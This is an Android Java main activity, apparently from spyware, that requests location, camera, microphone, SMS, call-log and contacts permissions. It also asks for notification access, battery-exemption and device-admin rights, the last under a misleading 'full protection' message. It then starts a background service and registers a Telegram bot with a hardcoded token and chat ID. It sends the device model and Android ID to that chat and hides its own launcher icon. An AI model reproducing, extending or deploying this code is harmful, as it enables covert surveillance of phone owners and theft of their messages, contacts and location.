package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receivers.AdminReceiver;
import com.alzahra.services.CoreService;
import com.alzahra.telegram.TelegramArabicBot;

import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST = 100;
    private static final int ADMIN_REQUEST = 200;
    private static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    private static final String CHAT_ID = "7344776596";
    
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        checkPermissions();
    }

    private void checkPermissions() {
        String[] permissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
        };

        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST);
        } else {
            requestAdditionalPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    showPermissionDialog(permissions[i]);
                    return;
                }
            }
            requestAdditionalPermissions();
        }
    }

    private void requestAdditionalPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Notification access
            if (!Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners").contains(getPackageName())) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                return;
            }

            // Battery optimization
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                return;
            }

            // Device admin
            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "التفعيل مطلوب للحماية الكاملة");
                startActivityForResult(intent, ADMIN_REQUEST);
                return;
            }
        }

        startServices();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ADMIN_REQUEST) {
            startServices();
        }
    }

    private void startServices() {
        startService(new Intent(this, CoreService.class));
        initTelegramBot();
        
        Toast.makeText(this, "✅ تم التفعيل بنجاح!", Toast.LENGTH_LONG).show();
        sendWelcomeMessage();
        
        // Hide app
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), 
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void initTelegramBot() {
        new Thread(() -> {
            try {
                TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
                TelegramArabicBot bot = new TelegramArabicBot(BOT_TOKEN, CHAT_ID);
                botsApi.registerBot(bot);
                Log.d("BOT", "Bot started successfully");
            } catch (Exception e) {
                Log.e("BOT", "Error: " + e.getMessage());
            }
        }).start();
    }

    private void sendWelcomeMessage() {
        new Thread(() -> {
            try {
                TelegramArabicBot bot = new TelegramArabicBot(BOT_TOKEN, CHAT_ID);
                bot.sendWelcomeMessage(android.os.Build.MODEL, android.provider.Settings.Secure.getString(
                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
            } catch (Exception e) {
                Log.e("BOT", "Failed to send welcome: " + e.getMessage());
            }
        }).start();
    }

    private void showPermissionDialog(String permission) {
        new AlertDialog.Builder(this)
            .setTitle("إذن مطلوب")
            .setMessage("يجب منح إذن " + permission + " للمتابعة")
            .setPositiveButton("إعادة المحاولة", (d, w) -> checkPermissions())
            .setNegativeButton("إلغاء", null)
            .show();
    }
}
